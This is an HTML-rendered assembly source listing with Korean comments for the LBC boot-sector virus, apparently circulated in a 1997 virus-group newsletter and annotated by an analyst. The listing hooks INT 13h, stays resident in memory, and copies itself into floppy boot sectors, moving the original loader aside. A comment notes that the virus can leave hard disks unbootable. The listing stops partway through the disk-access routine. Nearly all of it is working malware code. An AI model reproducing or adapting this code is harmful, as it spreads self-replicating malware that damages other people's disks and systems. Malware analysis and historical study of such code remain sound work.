<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>LBC-A.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                             LBC virus                     CVC #02  97/09</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 바이러스명 : LBC</span><span class="sc0">
</span><span class="sc1">; 제작자 : 모름 (Njh ?)</span><span class="sc0">
</span><span class="sc1">; 제작지 : 한국 (89년 발견)</span><span class="sc0">
</span><span class="sc1">; 분석자 : KOV</span><span class="sc0">
</span><span class="sc1">; 어셈블러 : MASM, TASM</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 종류 : 플로피,MBR</span><span class="sc0">
</span><span class="sc1">; 암호 : x</span><span class="sc0">
</span><span class="sc1">; 다형성 : x</span><span class="sc0">
</span><span class="sc1">; 은폐 : x</span><span class="sc0">
</span><span class="sc1">; 설명 : 구한 소스를 KOV 가 일부 수정한 것이다. 소스를 작성하신 분께 감사드린</span><span class="sc0">
</span><span class="sc1">;        다.</span><span class="sc0">
</span><span class="sc1">;        Brain 바이러스를 바탕에 두고 제작한 바이러스이다.</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">

 </span><span class="sc5">CODE</span><span class="sc0">           </span><span class="sc9">SEGMENT</span><span class="sc0">
                </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">

        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">CLI</span><span class="sc0">                             </span><span class="sc1">; 인터럽트 마스크</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">MAIN</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
                                                </span><span class="sc1">; Brain 바이러스 식별자</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">1234h</span><span class="sc0">                   </span><span class="sc1">; 사용하지 않는 부분</span><span class="sc0">
</span><span class="sc5">LBC_MARK</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">6845h</span><span class="sc0">                   </span><span class="sc1">; 바이러스 식별자</span><span class="sc0">

</span><span class="sc5">MAIN</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">                 </span><span class="sc1">; 프로그램시작 &amp; 프로그램 초기화</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0FFF0h</span><span class="sc0">
                </span><span class="sc6">STI</span><span class="sc0">                             </span><span class="sc1">; 인터럽트 플래그 세트</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0413h</span><span class="sc0">              </span><span class="sc1">; 메모리 크기 검사</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; 메모리 크기 감소 (2 KB)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">06h</span><span class="sc0">                </span><span class="sc1">; 옮길 곳의 세그먼트 계산</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7C00h</span><span class="sc0">              </span><span class="sc1">; 자신의 오프셋</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0100h</span><span class="sc0">              </span><span class="sc1">; 옮길 곳의 오프셋</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0200h</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">                   </span><span class="sc1">; 프로그램 상주</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                </span><span class="sc1">; 상주된 바이러스 프로그램으로 점프</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">CHANGE_INT13</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">

                                                </span><span class="sc1">; 상위 영역 에서 시작됨</span><span class="sc0">
</span><span class="sc5">CHANGE_INT13</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">004Ch</span><span class="sc0">              </span><span class="sc1">; 인터럽트 벡터 변경</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; 원래의 INT 13h의 오프셋</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; 원래의 INT 13h의 세그먼트</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_INT13</span><span class="sc0">   </span><span class="sc1">; 새로운 INT 13h의 오프셋</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc0">                 </span><span class="sc1">; 새로운 INT 13h의 세그먼트</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">OLD_INT13O</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">  </span><span class="sc1">; 원래 INT 13h의 오프셋 저장</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">OLD_INT13S</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">; 원래 INT 13h의 세그먼트 저장</span><span class="sc0">


                                                </span><span class="sc1">; 원래의 부트 스트랩 로더 읽기</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FUNC_NUM</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">   </span><span class="sc1">; INT 13h의 파라미터 설정</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BOOT_DRIVE</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">TRACK_SECTOR</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BOOT_HEAD</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">                 </span><span class="sc1">; 원래의 로더의 세그먼트</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">                 </span><span class="sc1">; INT 13h를 위한 버퍼 세그먼트</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7C00h</span><span class="sc0">              </span><span class="sc1">; 원래 로더의 오프셋</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BUFFERS</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; INT 13h를 위한 버퍼 오프셋</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INT_13H</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">NO_ROM_BASIC</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">                     </span><span class="sc1">; 디스켓을 읽을 수 없을 경우</span><span class="sc0">
                                                </span><span class="sc1">; ROM BASIC 작동 (최근 컴퓨터</span><span class="sc0">
                                                </span><span class="sc1">; 에는 없음)</span><span class="sc0">

</span><span class="sc5">NO_ROM_BASIC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RETF</span><span class="sc0">                  </span><span class="sc1">; 원래의 로더를 읽은 경우 그곳으로 점프</span><span class="sc0">


</span><span class="sc5">OLD_INT13O</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0EC59h</span><span class="sc0">                  </span><span class="sc1">; 원래 INT 13h의 오프셋</span><span class="sc0">
</span><span class="sc5">OLD_INT13S</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0F000h</span><span class="sc0">                  </span><span class="sc1">; 원래 INT 13h의 세그먼트</span><span class="sc0">
</span><span class="sc5">INTERVAL</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc0">                     </span><span class="sc1">; 감염 간격(매 5회 마다 감염)</span><span class="sc0">
</span><span class="sc5">FUNC_NUM</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc0">                     </span><span class="sc1">; 기능 코드 (2=읽기,3=쓰기)</span><span class="sc0">
</span><span class="sc5">BOOT_DRIVE</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; 드라이브 번호</span><span class="sc0">
</span><span class="sc5">BOOT_HEAD</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; 헤드 번호</span><span class="sc0">
</span><span class="sc5">TRACK_SECTOR</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001h</span><span class="sc0">                   </span><span class="sc1">; 트랙과 섹터 번호</span><span class="sc0">
</span><span class="sc5">BUFFERS</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0100h</span><span class="sc0">                   </span><span class="sc1">; 버퍼의 오프셋</span><span class="sc0">

</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;               Int     13h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NEW_INT13</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">STI</span><span class="sc0">                             </span><span class="sc1">; 인터럽트 플래그 SET</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc0">                </span><span class="sc1">; 디스크 읽기 검사</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">NO_INFECT</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">                </span><span class="sc1">; A 또는 B 드라이브인가 검사</span><span class="sc0">
                </span><span class="sc6">JG</span><span class="sc0">      </span><span class="sc5">NO_INFECT</span><span class="sc0">               </span><span class="sc1">; 이값이 문제의 값으로</span><span class="sc0">

</span><span class="sc1">; 만약 JB 등으로 바꾼다면 하드 디스크를 파괴 시키는 일은 없다.</span><span class="sc0">
</span><span class="sc1">; 즉            CMP     DL,02h</span><span class="sc0">
</span><span class="sc1">;               JB      NO_INFECT2 하면 하드 디스크를 파괴하는 일은 없다.</span><span class="sc0">
</span><span class="sc1">; 하드 디스크에 LBC 바이러스에 감염되면 부팅이 되지 않는데 그 이유는 바이러스</span><span class="sc0">
</span><span class="sc1">; 제작자는 원래 플로피 용으로 제작했기 때문에 하드 디스크로 부팅하지 않기 때</span><span class="sc0">
</span><span class="sc1">; 문이다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">INTERVAL</span><span class="sc0">    </span><span class="sc1">; 감염 간격 검사</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">NO_INFECT</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">INTERVAL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc1">; 감염 간격 초기화</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; 레지스터 대피</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; 데이타 세그먼트 조정</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">

                                                </span><span class="sc1">; 현재 사용중인 디스켓의 부트 섹터 읽기</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BOOT_DRIVE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0"> </span><span class="sc1">; INT 13h를 위한 파라미터 설정</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BOOT_HEAD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">TRACK_SECTOR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BUFFERS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0400h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FUNC_NUM</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ES_SETING</span><span class="sc0">               </span><span class="sc1">; ES 조정 후 원래의 INT 13h 실행</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">NO_INFECT1</span><span class="sc0">              </span><span class="sc1">; 읽기 에러일때는 포기</span><span class="sc0">

                                                </span><span class="sc1">; 이미 감염된 디스켓인가 검사</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">LBC_MARK</span><span class="sc0">           </span><span class="sc1">; 바이러스 식별자 검사</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">LBC_MARK</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">300h</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">INFECT</span><span class="sc0">                  </span><span class="sc1">; 감염되지 않은 디스켓이면 감염</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">NO_INFECT1</span><span class="sc0">        </span><span class="sc1">; 감염된 디스켓이면 재 감염 포기</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">


</span><span class="sc1">;               현재 사용중인 디스켓 감염</span><span class="sc0">
</span><span class="sc1">;               원래의 부트스트랩 로더 프로그램을 논리 섹터 11에 쓰기 (360 KB의</span><span class="sc0">
</span><span class="sc1">;               경우)</span><span class="sc0">
</span><span class="sc5">INFECT</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FUNC_NUM</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">   </span><span class="sc1">; INT 13h를 위한 파라미터(쓰기)</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BOOT_HEAD</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; 논리 섹터 10</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">TRACK_SECTOR</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ES_SETING</span><span class="sc0">               </span><span class="sc1">; ES 조정 후 원래의 INT 13h 실행</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">NO_INFECT1</span><span class="sc0">              </span><span class="sc1">; 쓰기 에러인 경우 감염 포기</span><span class="sc0">


</span><span class="sc1">;               바이러스 로더 프로그램 (LBC)를 부트 섹터에 쓰기</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BOOT_HEAD</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">TRACK_SECTOR</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">BUFFERS</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ES_SETING</span><span class="sc0">            </span><span class="sc1">; ES 조정 후 원래의 INT 13h 실행</span><span class="sc0">


</span><span class="sc5">NO_INFECT1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; 레지스터 복구</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">


</span><span class="sc5">NO_INFECT</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD_INT13O</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; 원래의 INT 13h로 점프</span><span class="sc0">

</span><span class="sc5">ES_SETING</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; ES 레지스터 조정</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc5">INT_13H</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0004h</span><span class="sc0">              </span><span class="sc1">; 재시도 횟수 설정</span><span class="sc0">

</span><span class="sc5">RETRY</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; 재시도 횟수 저장</span><span class="sc0">

</span><span class="sc1">;               INT 13h의 파라미터 설정</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">FUNC_NUM</span><span class="sc0">           </span><span class="sc1">; 기능 코드</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">                </span><span class="sc1">; 섹터 수</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BUFFERS</span><span class="sc0">            </span><span class="sc1">; 버퍼 오프셋</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">TRACK_SECTOR</span><span class="sc0">       </span><span class="sc1">; 트랙과 섹터 번호</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BOOT_HEAD</span><span class="sc0">          </span><span class="sc1">; 헤드 번호</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">BOOT_DRIVE</span><span class="sc0">         </span><span class="sc1">; 드라이브 번호</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; 인터럽트 리턴을 위한 스택 조정</span><span class="sc0">
